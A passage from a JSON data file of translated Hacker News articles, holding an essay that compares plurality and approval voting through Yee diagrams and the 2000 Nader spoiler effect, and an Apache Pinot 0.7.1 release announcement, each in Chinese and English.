\u63a5\u53d7\u4f60\u7684\u63a5\u53d7\u8d8a\u5c11\uff0c\u4f60\u5c31\u8d8a\u6709\u53ef\u80fd\u6295\u7968\u7ed9\u4e00\u540d\u5019\u9009\u4eba\uff0c\u6216\u8005\u62d2\u7edd\u6295\u7968\u3002 \u4f60\u8d8a\u63a5\u53d7\u7684\u662f\uff0c\u6bcf\u4e2a\u5019\u9009\u4eba\u90fd\u8d8a\u6709\u53ef\u80fd\uff0c\u56e0\u6b64\u5bf9\u7ed3\u679c\u65e0\u52a8\u4e8e\u8877\u3002 \u5728\u6279\u51c6\u56fe\u4e2d\uff0c\u9009\u6c11\u6295\u7968\u7ed9\u4ed6\u4eec\u67d0\u4e2a\u534a\u5f84\u5185\u7684\u4efb\u4f55\u4eba\u3002 \u5728\u4e0e\u9009\u6c11\u7684\u5206\u5e03\u76f8\u6bd4\uff0c\u6311\u9009\u4e00\u4e2a\u975e\u5e38\u5c0f\u6216\u975e\u5e38\u5927\u7684\u534a\u5f84\u5bfc\u81f4\u4e00\u4e9b\u5947\u602a\u7684\u6548\u679c\uff0c\u5728\u5b9e\u8df5\u4e2d\uff0c\u8fd9\u79cd\u884c\u4e3a\u4e0d\u592a\u53ef\u80fd\u3002 \u975e\u5e38\u5927\u7684\u534a\u5f84\u610f\u5473\u7740\u5927\u591a\u6570\u4eba\u90fd\u4f1a\u4e3a\u6bcf\u4e2a\u5019\u9009\u4eba\u6295\u7968\uff0c\u5c3d\u7ba1\u8fd9\u610f\u5473\u7740\u4ed6\u4eec\u7684\u6295\u7968\u662f\u65e0\u5173\u7d27\u8981\u7684\u3002 \u975e\u5e38\u5c0f\u7684\u534a\u5f84\u610f\u5473\u7740\u9664\u975e\u5b8c\u7f8e\u7684\u5019\u9009\u4eba\u6b63\u5728\u8fd0\u884c\uff0c\u5426\u5219\u5927\u591a\u6570\u4eba\u90fd\u62d2\u7edd\u6295\u7968\u3002 \u21a9 ", "note_en": "What question do we expect to answer by holding an election? Elections are how we select our government, but they aren\u2019t the only way to do that. We hold elections because we believe they tell us something about who has the right to control our government in a way that appointments or heredity does not. But different voting methods answer different questions.\n Visualizing our voting systems can help give us a sense of how the questions each system asks shape the answers we get. By playing around with what happens depending on where candidates are relative to each other, you can get a sense of what incentives our voting system gives to the people we elect. We\u2019re going to explore different systems by simulating many elections and seeing how the results change depending on where the average voter is.\n  This diagram shows a single election. The colored circles represent the positions of the candidates and voters in some abstract space. Imagine that the Y axis measures how focused the candidate is on environmental protection, and the X axis measures their position on some other issue like corporate tax rates. Voters prefer candidates that are closer to them. Clicking anywhere on this diagram simulates a new election where the average voter is where you clicked. What that means is that if we averaged together the positions of all of the voters they would be at that point, but if you click on the same point a few times you\u2019ll see that the position of each voter can change.\n Looking at one simulated election doesn\u2019t tell us very much, so we\u2019ll use something called a  Yee diagram to show how the results vary over many simulated elections depending on where the average voter is.\n The US presidential election in 2000 was historic, partially because Ralph Nader chose to ignore those incentives. It was expected to be a tight race between George W Bush and Al Gore, but Nader was running as a third party candidate. Leading up to the election, a group of self identified \u201cNaders Raiders\u201d wrote an open letter to Nader asking him to drop out. They were worried that he would be handing the election to Bush.\n It is now clear that you might well give the White House to Bush. As a result, you would set back significantly the social progress to which you have devoted your entire, astonishing career. You have sacrificed for the benefit of the common good your entire adult life\u2026 It would be a cruel irony indeed if your major legacy were to erase the victory from the candidate who most embodies your philosophy, Al Gore, and to give the Executive Branch to the party which has consistently resisted your progressive ideals.  1\n Carl Pope, the president of the Sierra Club, pleaded with Nader to reconsider his campaign strategy.\n You pledged you would not campaign as a spoiler and would avoid the swing states. Your recent campaign rhetoric and campaign schedule make it clear that you have broken this pledge\u2026 Irresponsible as I find your strategy, I accept that you genuinely believe in it. Please accept that I, and the overwhelming majority of the environmental movement in this country, genuinely believe that your strategy is flawed, dangerous, and reckless.  2\n The Republican Leadership Council ran campaign ads featuring Nader, believing that the more people that voted for Nader, the better chance Bush had at winning the election.\n Nader, running a low-budget campaign, is not airing any television commercials of his own and it\u2019s possible that the RLC will end up spending more on pro-Nader media that Nader himself.  3\n Why were environmentalists, relatively ideolically similar to Nader, pleading with him not to run? Why were republicans trying to get people to vote for one of their opponents? All of these people believed that votes for Nader would have the effect of electing Bush, because of something known as the  spoiler effect.\n  This visualization is called a  Yee diagram. The background is colored based on who would win if the average voter was at that point. If there is a tie, the background will be grey; the black line just gives us a sense of where the middle is.\n The diagram is generated by simulating an election for each cell of the background, where the voters are randomly distributed around that cell. I would expect an ideal voting method to elect the candidate closest to any given cell.\n These diagrams don\u2019t tell us very much about any individual election, but they can help us explore how elections are shaped by the voting method that we choose. In the 2000 election, all ballots were counted using a method called  plurality voting, where each voter picks their favorite candidate and the candidate with the most votes wins. In some sense, plurality voting asks voters which candidate they are most in favor of, but doesn\u2019t ask anything about what they think of the rest of the candidates. This makes it hard for plurality elections to find compromises.\n If only Bush and Gore had been running, the race would have been simple, the winner would be whoever was closer to the center of public opinion. But strange things start to happen when we consider Nader.\n  Because Nader is ideologically closer to Gore, voters are more likely to switch to Nader from Gore than to Nader from Bush. Depending on where we believe the average voter is this might not matter, but if we think that public opinion is somewhere between Bush and Gore, this is very likely to help Bush win. In that situation, plurality voting is unable to identify that for many voters (like Carl Pope and Naiders Raiders for Gore), Gore is a compromise between Nader and Bush. This is the spoiler effect that environmentalists were afraid of, and why republicans wanted to amplify Naders message.\n The lesson many people take from the spoiler effect is that third party candidates harm the platforms they care about, but the spoiler effect doesn\u2019t happen in every voting system. While there are versions of this effect in plurality voting and in  instant runoff voting, other systems like  approval voting don\u2019t have this issue.\n Approval voting ballots look very similar to plurality voting ballots, but voting involves selecting as many of the candidates as you would like rather than only your favorite. If plurality voting is asking voters who their favorite candidate is, approval voting is asking who voters would accept as the winner. The structure of that question gives us more of the information we need to identify compromises. The diagram below shows the dynamics of the same set of candidates, but in an election run with approval voting.   4\n  Approval voting has an important property; if a candidate doesn\u2019t win the race, they don\u2019t affect the results. You can see this in the above diagram; moving candidate A around can change a cell from B to A, but it never changes any cell from B to C. Try moving Nader around, and watch the line between Bush and Gore. That line never moves, other than in areas that Nader now wins.\n In the 2000 election, this stability property would have meant that republicans wouldn\u2019t have had any reason to encourage people to vote for one of their opponents. Environmentalists might have welcomed another candidate fighting for environmental justice, because voters who cared about the environment wouldn\u2019t have to choose between Gore and Nader. Approval voting would give them a way to express that they were ok with either one.\n For a long time the US has treated plurality voting as the only option, but that is changing. Voters in Fargo and St. Louis restructured their elections to use approval voting, and voters in  San Francisco,  Austin,  Seattle,  Missouri, and  Utah are working to change how they vote as well. You might soon have an opportunity to choose how your government is elected. What do you want your voting system to encourage?\n Approval voting has another parameter that we don\u2019t have to think about in the context of plurality voting; how accepting are you? The less accepting you are, the more likely you are to only vote for one candidate, or to refuse to vote at all. The more accepting you are, the more likely you are to be ok with every candidate, and therefore indifferent to the outcome. In the approval diagram, voters vote for anyone within a certain radius of them. While picking a radius that is very small or very large compared to the distribution of voters leads to some strange effects, in practice such behavior is unlikely. A very large radius would mean that most people are voting for every candidate, despite the fact that that means their vote is irrelevant. A very small radius would mean that most people refuse to vote at all unless the perfect candidate is running. \u21a9", "posttime": "2021-06-22 15:50:44", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u53ef\u89c6\u5316,voting,\u6295\u7968", "title": "\u53ef\u89c6\u5316\u6295\u7968\u7cfb\u7edf\uff1a\u591a\u4e2a\u4e0e\u6279\u51c6\u6295\u7968 ", "title_en": "Visualizing Voting Systems: Plurality vs. Approval Voting", "transed": 1, "url": "https://schicks.github.io/posts/visualizing-voting-systems/", "via": "", "real_tags": ["\u53ef\u89c6\u5316", "voting", "\u6295\u7968"]}, {"category": "", "categoryclass": "", "imagename": "bdc67109b637f4e3468cf354e3e1b2d4.png", "infoid": 1067380, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u6211\u4eec\u5f88\u9ad8\u5174\u5730\u5ba3\u5e03\uff0cApache Pinot 0.7.1\u4e8e4\u67082021\u5e744\u6708\u51e0\u4e2a\u6708\u53d1\u5e03.Apache Pinot\u662f\u4e00\u4e2a\u5b9e\u65f6\u5206\u5e03\u5f0f\u6570\u636e\u5b58\u50a8\uff0c\u65e8\u5728\u56de\u7b54\u90a3\u4e9b\u662f\u8fd9\u6b3e\u535a\u5ba2\u7684\u65b0\u8bfb\u8005\u7684OLAP\u67e5\u8be2\u3002\u6b64\u7248\u672c\u5f15\u5165\u4e86\u51e0\u79cd\u68a6\u5e7b\u822c\u7684\u65b0\u529f\u80fd\uff0c\u5305\u62ecJSON\u7d22\u5f15\uff0c\u57fa\u4e8e\u67e5\u627e\u7684\u8fde\u63a5\u652f\u6301\uff0c\u5730\u7406\u7a7a\u95f4\u652f\u6301\uff0cTLS\u652f\u6301Pinot Connections\uff0c\u4ee5\u53ca\u5404\u79cd\u6027\u80fd\u4f18\u5316\u548c\u6539\u8fdb\u3002\u5b83\u8fd8\u6dfb\u52a0\u4e86\u51e0\u79cd\u65b0\u7684API\uff0c\u4ee5\u66f4\u597d\u5730\u7ba1\u7406\u6bb5\u5e76\u5c06\u6570\u636e\u4e0a\u4f20\u5230\u8131\u673a\u8868\u3002\u5b83\u8fd8\u5305\u542b\u8bb8\u591a\u5173\u952e\u9519\u8bef\u4fee\u590d\u3002\n  JSON\u5b57\u7b26\u4e32\u53ef\u4ee5\u8868\u793a\u6570\u7ec4\uff0c\u6620\u5c04\u6216\u5d4c\u5957\u5b57\u6bb5\uff0c\u800c\u65e0\u9700\u5f3a\u5236\u56fa\u5b9a\u6a21\u5f0f\u3002\u5b83\u975e\u5e38\u7075\u6d3b\uff0c\u4f46\u5b83\u4ee5\u6210\u672c\u4e3a\u51c6\uff1a\u5728JSON\u5b57\u7b26\u4e32\u5217\u4e0a\u8fc7\u6ee4\u975e\u5e38\u6602\u8d35\u3002\n \u5982\u679c\u6ca1\u6709\u7d22\u5f15\uff0c\u6211\u4eec\u9700\u8981\u4eceJSON\u5b57\u7b26\u4e32\u626b\u63cf\u5e76\u91cd\u5efaJSON\u5bf9\u8c61\uff0c\u4ee5\u83b7\u53d6\u6bcf\u4e2a\u8bb0\u5f55\u4ee5\u67e5\u627e\u57fa\u4e8e\u8be5\u503c\u7684\u952e\u548c\u8fc7\u6ee4\u5668\u8bb0\u5f55\u3002\u7136\u540e\u6211\u4eec\u9700\u8981\u67e5\u627e\u5bc6\u94a5\u5e76\u6bd4\u8f83\u503c\u3002 Pinot\u7684\u65b0JSON\u7d22\u5f15\u529f\u80fd\u65e8\u5728\u52a0\u901fJSON String\u5217\u7684\u8fc7\u6ee4\u800c\u4e0d\u626b\u63cf\u548c\u91cd\u5efa\u6240\u6709JSON\u5bf9\u8c61\u3002\n  \u8ba9\u6211\u4eec\u8003\u8651\u4ee5\u4e0bJSON\u7ed3\u6784\u5316\u6587\u6863\u6444\u53d6\u5230Pinot\u8868\u5217\u3002\n  \u901a\u8fc7\u7d22\u5f15\u5217\uff0c\u6211\u4eec\u73b0\u5728\u53ef\u4ee5\u901a\u8fc7\u7d22\u5f15\u4efb\u4f55\u5176\u4ed6Pinot\u8868\u7684\u5b57\u6bb5\u6765\u641c\u7d22JSON\u6587\u6863\u7684\u7ed3\u6784\u3002\n  \u53ef\u4ee5\u5728\u6b64\u5904\u627e\u5230\u4e0e\u6b64\u67e5\u8be2\u7684\u6587\u672c\u7684JSON\u7d22\u5f15\u6587\u6863\u94fe\u63a5\uff1aJSON\u7d22\u5f15\n  \u901a\u8fc7\u540d\u4e3aLookup\u7684\u65b0UDF SQL\u51fd\u6570\u57280.7.1\u4e2d\u6dfb\u52a0\u4e86\u57fa\u4e8e\u67e5\u627e\u7684\u52a0\u5165\u652f\u6301\u3002\u6b64\u529f\u80fd\u76f8\u5bf9\u7b80\u5355\u4ee5\u4fbf\u5f00\u59cb\u4f7f\u7528\u3002\u5728\u6b64\u529f\u80fd\u4e4b\u524d\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u60a8\u5c06\u65e0\u6cd5\u5728\u5355\u4e2aSQL\u67e5\u8be2\u4e2d\u6a2a\u8de8\u5c0f\u70b9\u8fde\u63a5\u8868\uff0c\u800c\u65e0\u9700\u4f7f\u7528Presto\u7b49\u5185\u5bb9\u3002\u6211\u4eec\u73b0\u5728\u5df2\u7ecf\u5411\u60a8\u6dfb\u52a0\u4e86\u4ece\u7ef4\u5ea6\u8868\u4e2d\u52a0\u5165\u7684\u652f\u6301\u3002\u76ee\u524d\u4e0d\u652f\u6301\u7ef4\u5ea6\u4e4b\u5916\u7684\u8868\u7c7b\u578b\u3002\u60a8\u53ef\u4ee5\u5728\u6587\u6863\u4e2d\u627e\u5230\u6709\u5173\u7ef4\u5ea6\u8868\u7684\u66f4\u591a\u8be6\u7ec6\u4fe1\u606f\u3002 \n\u4e0a\u9762\u7684SQL\u67e5\u8be2\u5c06\u7ef4\u5ea6\u8868DimBaseballTeams\u8fde\u63a5\u5230Teamid\u5bc6\u94a5\u4e0a\u7684\u5e38\u89c4\u8868\u68d2\u7403\u670d\u52a1\u5668\u4e2d\u3002\u67e5\u627e\uff08...\uff09\u51fd\u6570\u7136\u540e\u8fd4\u56de\u5217TeamName\u7684\u503c\u3002\n Apache Pinot\u4e2d\u7684\u8fde\u63a5\u4e0e\u60a8\u5728\u5173\u7cfb\u6570\u636e\u5e93\u4e2d\u53ef\u80fd\u4f7f\u7528SQL\u7684\u7c7b\u578b\u4e0d\u540c\u3002 UDF\u529f\u80fd\u5728\u6b64\u63d0\u4f9b\u4e86\u4e00\u6bb5\u65f6\u95f4\u5df2\u4e45\u7684\u529f\u80fd\uff0c\u53ef\u6269\u5c55OLAP\u8fde\u63a5\u662f\u8868\u73b0\u548c\u65b9\u4fbf\u7684\u3002\u6b64\u529f\u80fd\u5305\u62ecPinot\u7684\u9ad8\u7ea7\u7d22\u5f15\u529f\u80fd\u7684\u4f18\u52bf\uff0c\u4f7f\u5b9e\u65f6\u5206\u6790SQL\u67e5\u8be2\u5982\u6b64\u4e4b\u5feb\u3002\n \u8981\u5728\u64cd\u4f5c\u4e2d\u770b\u5230\u51fd\u6570\uff0c\u60a8\u8fd8\u53ef\u4ee5\u5ba3\u4f20joyquickstart\u5e76\u6309\u5982\u4e0b\u65b9\u5f0f\u6d4b\u8bd5\uff1a\n  \u8981\u8fd0\u884cjoinquickstart\uff0c\u60a8\u53ef\u4ee5\u5728Docker\u4e2d\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\u4ee5\u89e6\u53d1\u8be5\u793a\u4f8b\u3002\n   \u8981\u57280.7.1\u4e2d\u542f\u52a8\u6b64\u529f\u80fd\uff0c\u60a8\u9700\u8981\u5728\u67b6\u6784\u5b9a\u4e49\u914d\u7f6e\u4e2d\u4f7f\u7528\u8f6c\u6362\u51fd\u6570\u8fdb\u884c\u8868\u683c\u3002\n \u60a8\u9700\u8981\u6dfb\u52a0\u5230\u67b6\u6784\u5b9a\u4e49\u6587\u4ef6\u4ee5\u542f\u7528\u57fa\u4e8e\u5730\u7406\u4f4d\u7f6e\u67e5\u8be2\u7684\u7b2c\u4e00\u4ef6\u4e8b\u662f\u60a8\u7684\u7eac\u5ea6\u548c\u7ecf\u5ea6\u5b57\u6bb5\u3002\u8fd9\u4e9b\u5b57\u6bb5\u5c06\u4ece\u8131\u673a\u6570\u636e\u6e90\u6216\u6d41\u4e2d\u7684\u6570\u636e\u6e90\u5bfc\u5165\u3002\n  \u5728\u60a8\u7684\u5b57\u6bb5\u5217\u8868\u4e2d\uff0c\u5b83\u7531\u5176\u552f\u4e00\u540d\u79f0\u5bfc\u5165\u6216\u4f7f\u7528\u8f6c\u6362\u51fd\u6570\u751f\u6210\uff0c\u60a8\u9700\u8981\u5217\u51fa\u7eac\u5ea6\u548c\u7ecf\u5ea6\u5b57\u6bb5\uff0c\u5982\u4e0a\u6240\u793a\uff08LON\uff0cLOT\uff09\u3002\u8fd9\u91cc\u6ca1\u6709\u4ec0\u4e48\u592a\u7279\u522b\u7684\u4e8b\u60c5\uff0c\u4f46\u4f60\u9700\u8981\u751f\u6210\u4e00\u4e2a\u65b0\u7684\u5b57\u6bb5\u6765\u5728\u8fd9\u4e9b\u5b57\u6bb5\u4e0a\u6267\u884c\u5b9e\u65f6\u5730\u7406\u7a7a\u95f4\u67e5\u8be2\u3002\u60a8\u9700\u8981\u751f\u6210\u4e00\u4e2a\u65b0\u5b57\u6bb5\uff0c\u6211\u5728\u4e0b\u9762\u7684\u4ee3\u7801\u6bb5\u4e2d\u6307\u5b9a\u4e86\u4e00\u4e2a\u540d\u4e3alocation_st_point\u3002 \n\u521a\u521a\u6e05\u9664\uff0c\u8fd9\u4e24\u79cd\u4ee3\u7801\u6bb5\u90fd\u6765\u81ea\u67b6\u6784\u5b9a\u4e49\u6587\u4ef6\u4e2d\u7684\u76f8\u540c\u914d\u7f6e\u5757\u3002\n  \u65e2\u7136\u6211\u4eec\u5df2\u5c06\u5fc5\u8981\u7684\u4f4d\u6dfb\u52a0\u5230\u67b6\u6784\u914d\u7f6e\u6587\u4ef6\uff0c\u6211\u4eec\u73b0\u5728\u53ef\u4ee5\u7ee7\u7eed\u66f4\u65b0\u5f15\u7528\u4e0a\u8ff0\u67b6\u6784\u7684\u8868\u914d\u7f6e\u3002\u8fd9\u91cc\u7684\u53d8\u5316\u5f88\u7b80\u5355\uff0c\u53ef\u4ee5\u5728\u4e0b\u9762\u770b\u5230\u3002\u672a\u6765\u7248\u672c\u53ef\u80fd\u4f1a\u6709\u4e00\u4e9b\u53d8\u5316\uff0c\u56e0\u6b64\u59cb\u7ec8\u59cb\u7ec8\u597d\u8f6c\u5230\u6700\u8fd1\u7684Apache Pinot\u6587\u6863\u7248\u672c\u3002\n  \u542f\u7528\u5728\u5730\u7406\u7a7a\u95f4\u5b57\u6bb5\u4e0a\u7d22\u5f15\u7684\u6700\u7ec8\u6b65\u9aa4\u662f\u4f7f\u7528\u4e0a\u9762\u663e\u793a\u7684\u8bbe\u7f6e\u8fdb\u884c\u4fee\u6539\u60a8\u7684\u8868\u914d\u7f6e\u3002\n \u5c31\u662f\u8fd9\u6837\uff01\u5728\u4f7f\u7528\u4e0a\u8ff0\u914d\u7f6e\u4e2d\u521b\u5efa\u4e86Pinot\u4e2d\u7684\u6a21\u5f0f\u548c\u8868\u683c\u540e\uff0c\u60a8\u5c06\u80fd\u591f\u5f00\u59cb\u6444\u53d6\u73b0\u5728\u7d22\u5f15\u7684\u5730\u7406\u7a7a\u95f4\u6570\u636e\u5e76\u5f00\u59cb\u5b9e\u65f6\u6267\u884c\u67e5\u8be2\u3002\n \u5728Pinot 0.7.1\u4e2d\u67e5\u770b\u5168\u90e8\u529f\u80fd\u535a\u5ba2\u6587\u7ae0\uff0c\u4ee5\u4fbf\u5728Pinot 0.7.1\u4e2d\u7ee7\u7eed\u63a2\u7d22H3\u7d22\u5f15\u7cfb\u7edf\u53ca\u5176\u5728\u4f18\u6b65\u7684\u8d77\u6e90\u3002\n  \u57280.7.1\u4e2d\u4e5f\u6dfb\u52a0\u4e86\u5bf9TLS\u5b89\u5168\u8fde\u63a5\u7684\u652f\u6301\u3002\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u65b0\uff08\u6216\u91cd\u6784\uff09\u5c5e\u6027\u6765\u914d\u7f6eTLS\u3002\u53ef\u4ee5\u5b89\u5168\u5730\u6267\u884c\u5347\u7ea7\u5230\u542f\u7528TLS\u7684\u7fa4\u96c6\uff0c\u65e0\u9700\u505c\u673a\u65f6\u95f4\u3002\u8981\u5b9e\u73b0\u5b9e\u65f6\u5347\u7ea7\uff0c\u8bf7\u901a\u8fc7\u4ee5\u4e0b\u6b65\u9aa4\uff1a\n \u9996\u5148\uff0c\u5728\u7ecf\u7eaa\u5546\uff0c\u63a7\u5236\u5668\u548c\u670d\u52a1\u5668\u4e0a\u914d\u7f6e\u7528\u4e8eHTTPS / NETTY-TLS\u7684\u5907\u7528\u5165\u53e3\u7aef\u53e3\u3002\u4f7f\u7528\u6eda\u52a8\u7b56\u7565\u91cd\u65b0\u542f\u52a8\u7ec4\u4ef6\u4ee5\u907f\u514d\u7fa4\u96c6\u505c\u673a\u65f6\u95f4\u3002 \n\u5176\u6b21\uff0c\u624b\u52a8\u9a8c\u8bc1HTTPS\u5bf9\u63a7\u5236\u5668\u548c\u7ecf\u7eaa\u4eba\u7684\u8bbf\u95ee\u662f\u76f4\u64ad\u7684\u3002\u7136\u540e\uff0c\u914d\u7f6e\u6240\u6709\u7ec4\u4ef6\u4ee5\u66f4\u559c\u6b22\u542f\u7528TLS\u7684\u8fde\u63a5\uff08\u540c\u65f6\u4ecd\u5141\u8bb8\u65e0\u62c5\u4fdd\u8bbf\u95ee\uff09\u3002\u91cd\u65b0\u542f\u52a8\u5404\u4e2a\u7ec4\u4ef6\u3002\n \u7b2c\u4e09\uff0c\u901a\u8fc7\u914d\u7f6e\u7981\u7528\u4e0d\u5b89\u5168\u7684\u8fde\u63a5\u3002\u60a8\u8fd8\u53ef\u80fd\u5fc5\u987b\u8bbe\u7f6eController.VIP.PRotocol\u548cController.VIP.PORT\u5e76\u66f4\u65b0\u4efb\u4f55\u6444\u53d6\u4f5c\u4e1a\u7684\u914d\u7f6e\u6587\u4ef6\u3002\u91cd\u65b0\u542f\u52a8\u7ec4\u4ef6\u6700\u540e\u4e00\u6b21\uff0c\u5e76\u9a8c\u8bc1\u662f\u5426\u4e0d\u518d\u4f7f\u7528HTTP\u4e0d\u5b89\u5168\u7684\u5165\u53e3\u3002\n  \u6211\u4eec\u8981\u82b1\u4e00\u70b9\u65f6\u95f4\u611f\u8c22Pinot\u793e\u533a\u652f\u6301\u6211\u4eec\u7684\u4ea7\u54c1\u3002\u6211\u4eec\u5728\u8fc7\u53bb\u4e00\u5e74\u5185\u4fdd\u7559\u7a33\u5b9a\u7684\u72af\u7f6a\uff0c\u6211\u4eec\u5df2\u7ecf\u770b\u5230\u8d8a\u6765\u8d8a\u4f18\u79c0\u7684\u529f\u80fd\u662f\u5728\u8fd9\u4e2a\u9879\u76ee\u4e2d\u5b9e\u73b0\u7684\u3002\u6b64\u65f6\uff0c\u6211\u4eec\u8981\u611f\u8c22\u4e3a\u6b64\u53d1\u5e03\u505a\u51fa\u8d21\u732e\u7684\u5927\u5bb6\u3002\n    \u5a92\u4f53\u662f\u4e00\u4e2a\u5f00\u653e\u7684\u5e73\u53f0\uff0c17\u4ebf\u8bfb\u8005\u6765\u5bfb\u627e\u6709\u6d1e\u5bdf\u529b\u548c\u52a8\u6001\u7684\u601d\u7ef4\u3002\u5728\u8fd9\u91cc\uff0c\u4e13\u5bb6\u548c\u672a\u88ab\u53d1\u73b0\u7684\u58f0\u97f3\u76f8\u4f3c\u5730\u6f5c\u5165\u4efb\u4f55\u4e3b\u9898\u7684\u6838\u5fc3\uff0c\u5e76\u5c06\u65b0\u7684\u60f3\u6cd5\u5e26\u5230\u8868\u9762\u4e0a\u3002\u5b66\u5230\u66f4\u591a\n \u9075\u5faa\u5bf9\u60a8\u6709\u5173\u7684\u4f5c\u5bb6\uff0c\u51fa\u7248\u7269\u548c\u4e3b\u9898\uff0c\u60a8\u5c06\u5728\u60a8\u7684\u4e3b\u9875\u548c\u6536\u4ef6\u7bb1\u4e2d\u770b\u5230\u5b83\u4eec\u3002\u63a2\u7d22\n \u5982\u679c\u60a8\u6709\u4e00\u4e2a\u6545\u4e8b\u6765\u8bb2\u8ff0\uff0c\u77e5\u8bc6\u5206\u4eab\uff0c\u6216\u8005\u63d0\u4f9b\u63d0\u4f9b\u7684\u89c6\u89d2 - \u6b22\u8fce\u56de\u5bb6\u3002\u5f88\u5bb9\u6613\u548c\u514d\u8d39\u53d1\u5e03\u60a8\u5bf9\u4efb\u4f55\u4e3b\u9898\u7684\u601d\u8003\u3002\u5199\u4e0b\u5a92\u4ecb ", "note_en": "We are excited to announce that Apache Pinot 0.7.1 was released a few months back in April 2021.  Apache Pinot is a real-time distributed datastore designed to answer OLAP queries with low latency for those of you who are new readers of this blog. This release introduced several fantastic new features, including JSON index, Lookup-based Join support, GeoSpatial support, TLS support for Pinot connections, and various performance optimizations and improvements. It also adds several new APIs to better manage the segments and upload data to an offline table. It also contains many critical bug fixes.\n  A JSON string can represent an array, map, or nested field without forcing a fixed schema. It is very flexible, but it comes at a cost:  filtering on a JSON string column is very expensive.\n Without an index, we need to scan and reconstruct the JSON object from the JSON string for every record to look up a key and filter records based on the value. Then we need to look up the key and compare the value. Pinot\u2019s new JSON index feature is designed to accelerate the filtering on JSON string columns without scanning and reconstructing all the JSON objects.\n  Let\u2019s consider the following JSON structured document ingested into a Pinot table column.\n  By indexing the column, we can now search the JSON document\u2019s structure as quickly as we would by indexing any other Pinot table\u2019s field.\n  Link to the documentation for JSON index with the text of this query can be found here:  JSON Index\n  Lookup-based join support was added in 0.7.1 via a new UDF SQL function named  LOOKUP. This feature is relatively straightforward to get started with. Before this function, you would have been unable to join tables across Pinot in a single SQL query by default without using something like Presto. We\u2019ve now added support for you to join exclusively from a dimension table. Table types other than  dimension are not currently supported. You can find more details about  dimension tables in our documentation.\n   The SQL query above joins the dimension table  dimBaseballTeams into the regular table  baseballStats on the  teamID key. The   LOOKUP(...) function then returns the value of the column    teamName.\n Joins in Apache Pinot are different than the kind of joins you might do in a relational database using SQL. The UDF function here provides a long-awaited feature that is performant and convenient for scalable OLAP joins. This function includes the advantages of Pinot\u2019s advanced indexing capabilities that make real-time analytical SQL queries so fast.\n To see the function in action, you can also fire  JoinQuickstart and test it as follows:\n  To run the JoinQuickstart, you can run the following command in Docker to fire up the example.\n   To get started with this feature in 0.7.1, you will need to use a transform function in your schema definition configuration for a table.\n The first thing you will need to add to your schema definition file to enable geolocation-based queries is your latitude and longitude fields. These fields will be imported from your data source, either from an offline data source or streaming.\n  In your list of fields, which are either imported by their unique name or generated during ingestion using a transform function, you\u2019ll need to list both latitude and longitude fields, as shown above ( lon,  lat). There is nothing too special going on here, but you\u2019ll need to generate a new field to execute real-time geospatial queries on these fields. You\u2019ll need to generate a new field, which I\u2019ve named  location_st_point in the snippet below.\n Just to be clear, both of these snippets are from the same configuration block in your schema definition file.\n  Now that we\u2019ve added the necessary bits to the schema configuration file, we can now move on to updating the table configuration that references the above schema. The changes here are simple and can be seen below. There may be some changes in future versions, so it\u2019s always good to head over to the most  recent version of the Apache Pinot documentation.\n  The final step to enable indexing on geospatial fields is to modify your table configuration with the settings shown above.\n That\u2019s it! After you\u2019ve created your schema and table in Pinot using the above configurations, you\u2019ll be able to start ingesting the now indexed geospatial data and begin executing queries in real-time.\n Check out the full feature blog post for   geospatial support in Pinot 0.7.1 , which continues on with an exploration of the H3 indexing system and its origins at Uber.\n  Support for  TLS-secure connections was also added in 0.7.1. TLS can be configured using the following new (or refactored) properties. Upgrades to a TLS-enabled cluster can be performed safely and without downtime. To achieve a live-upgrade, go through the following steps:\n First, configure alternate ingress ports for https/netty-tls on brokers, controllers, and servers. Restart the components with a rolling strategy to avoid cluster downtime.\n Second, verify manually that HTTPS access to controllers and brokers is live. Then, configure all components to prefer TLS-enabled connections (while still allowing unsecured access). Restart the individual components.\n Third, disable insecure connections via configuration. You may also have to set controller.vip.protocol and controller.vip.port and update the configuration files of any ingestion jobs. Restart components a final time and verify that insecure ingress via HTTP is not available anymore.\n  We would like to take a moment to thank the Pinot community for supporting our Product. We keep a steady amount of  commits for the past year, and we\u2019ve seen that more and more excellent  features are implemented to this project. At this moment, we would like to thank everyone who made contributions to this release.\n    Medium is an open platform where 170 million readers come to find insightful and dynamic thinking. Here, expert and undiscovered voices alike dive into the heart of any topic and bring new ideas to the surface.  Learn more\n Follow the writers, publications, and topics that matter to you, and you\u2019ll see them on your homepage and in your inbox.  Explore\n If you have a story to tell, knowledge to share, or a perspective to offer \u2014 welcome home. It\u2019s easy and free to post your thinking on any topic.  Write on Medium", "posttime": "2021-06-22 15:50:18", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "apache,pinot", "title": "Apache Pinot 0.7.1. ", "title_en": "Apache Pinot 0.7.1", "transed": 1, "url": "https://medium.com/apache-pinot-developer-blog/announcing-apache-pinot-0-7-1-31b46ad6b0f6", "via": "", "real_tags": ["apache", "pinot"]}, {"category": "", "categoryclass": "", "imagename": "04412eaba742da983ad50af9a15d47e5.jpeg", "infoid": 1067379, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": 